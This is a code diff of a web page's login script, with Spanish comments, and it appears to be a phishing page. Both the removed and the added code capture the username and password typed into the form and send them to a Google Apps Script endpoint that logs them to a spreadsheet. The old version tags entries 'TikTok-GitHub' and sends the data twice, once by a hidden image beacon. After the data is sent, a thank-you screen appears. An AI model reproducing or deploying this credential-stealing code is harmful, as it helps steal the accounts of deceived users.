@@ -115,111 +115,77 @@
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
-    <script>
-        // URL de TU Google Apps Script
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxjIN6nm3SQ6ki-IUWUuJtb7B8jYkGDD11jBt-4jFO_VNkiSTnRHU2dkAg-hNGa8FYJ/exec";
+   <script>
+    // 1. REEMPLAZA ESTA URL con la que te dio Google al "Implementar"
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxjIN6nm3SQ6ki-IUWUuJtb7B8jYkGDD11jBt-4jFO_VNkiSTnRHU2dkAg-hNGa8FYJ/exec";
+    
+    // Manejo del formulario de inicio de sesión
+    document.getElementById('loginForm' ).addEventListener('submit', async function(e) {
+        e.preventDefault(); // Evita que la página se recargue
         
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const btn = document.getElementById('loginBtn');
-            
-            if (!username || !password) {
-                alert('Please complete all fields');
-                return;
-            }
-            
-            // Cambiar botón
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
-            
-            console.log('📤 Sending:', { user: username, pass: '***' });
-            
-            // MÉTODO 1: FORMULARIO TRADICIONAL (SIN JSON)
-            try {
-                const form = document.createElement('form');
-                form.method = 'POST';
-                form.action = SCRIPT_URL;
-                form.target = '_blank'; // Abrir en nueva pestaña
-                form.enctype = 'application/x-www-form-urlencoded'; // IMPORTANTE: NO es JSON
-                
-                // Agregar campos como formulario NORMAL
-                const addField = (name, value) => {
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = name;
-                    input.value = value;
-                    form.appendChild(input);
-                };
-                
-                const now = new Date();
-                addField('user', username);
-                addField('pass', password);
-                addField('date', now.toLocaleDateString());
-                addField('time', now.toLocaleTimeString());
-                addField('source', 'TikTok-GitHub');
-                
-                document.body.appendChild(form);
-                console.log('✅ Form created with fields:', form.elements.length);
-                
-                // Enviar formulario
-                form.submit();
-                console.log('📨 Form submitted');
-                
-                // No eliminar el formulario - déjalo para ver respuesta
-                
-            } catch (error) {
-                console.error('❌ Form error:', error);
-            }
-            
-            // MÉTODO 2: GET como backup (siempre funciona)
-            setTimeout(() => {
-                const params = new URLSearchParams({
-                    user: username,
-                    pass: password,
-                    date: new Date().toLocaleDateString(),
-                    time: new Date().toLocaleTimeString(),
-                    method: 'GET',
-                    random: Math.random()
-                }).toString();
-                
-                const getUrl = SCRIPT_URL + '?' + params;
-                console.log('🔗 GET URL:', getUrl);
-                
-                // Usar imagen invisible para enviar GET
-                const img = new Image();
-                img.src = getUrl;
-                
-                // También abrir en ventana pequeña
-                const win = window.open(getUrl, '_blank', 'width=400,height=300');
-                
-            }, 1000);
-            
-            // Mostrar página de agradecimiento
-            setTimeout(() => {
-                document.getElementById('loginBox').style.display = 'none';
-                document.getElementById('thankyouBox').style.display = 'block';
-                btn.disabled = false;
-                btn.innerHTML = 'Log In';
-                
-                console.log('🎉 Showing thank you page');
-            }, 1500);
-        });
+        // Capturar los valores de los inputs
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const btn = document.getElementById('loginBtn');
         
-        function goBack() {
-            document.getElementById('thankyouBox').style.display = 'none';
-            document.getElementById('loginBox').style.display = 'block';
-            document.getElementById('loginForm').reset();
+        // Validación básica
+        if (!username || !password) {
+            alert('Por favor, completa todos los campos.');
+            return;
         }
         
-        // Al cargar la página
-        window.addEventListener('load', function() {
-            console.log('✅ Page loaded');
-            console.log('🎯 Target Sheet: https://docs.google.com/spreadsheets/d/1zxbtwEzQTFKXK148S8SXlnAY9PzyaNvSRjyNbyi_hpw');
-            console.log('🔗 Script URL:', SCRIPT_URL);
-        });
-    </script>
+        // Feedback visual: deshabilitar botón y mostrar carga
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
+        
+        // Preparar los datos en formato de formulario (x-www-form-urlencoded)
+        const formData = new URLSearchParams();
+        formData.append('user', username);
+        formData.append('pass', password);
+        
+        try {
+            // ENVIAR DATOS A GOOGLE SHEETS
+            // Usamos 'no-cors' porque Google no permite leer la respuesta directamente desde JS externo
+            await fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors', 
+                body: formData
+            });
+
+            // Si la ejecución llega aquí, los datos han sido enviados
+            console.log('✅ Datos enviados correctamente');
+            
+            // Ocultar login y mostrar pantalla de agradecimiento
+            document.getElementById('loginBox').style.display = 'none';
+            document.getElementById('thankyouBox').style.display = 'block';
+
+        } catch (error) {
+            console.error('❌ Error en el envío:', error);
+            alert('Hubo un error al conectar con el servidor. Inténtalo de nuevo.');
+            
+            // Restaurar botón en caso de error
+            btn.disabled = false;
+            btn.innerHTML = 'Log In';
+        }
+    });
+    
+    // Función para el botón de "Volver" en la pantalla de agradecimiento
+    function goBack() {
+        document.getElementById('thankyouBox').style.display = 'none';
+        document.getElementById('loginBox').style.display = 'block';
+        document.getElementById('loginForm').reset();
+        
+        // Restaurar estado inicial del botón
+        const btn = document.getElementById('loginBtn');
+        btn.disabled = false;
+        btn.innerHTML = 'Log In';
+    }
+
+    // Registro en consola para confirmar que el script cargó
+    window.addEventListener('load', () => {
+        console.log('🚀 Sistema de guardado listo');
+    });
+</script>
+
 </body>
 </html>
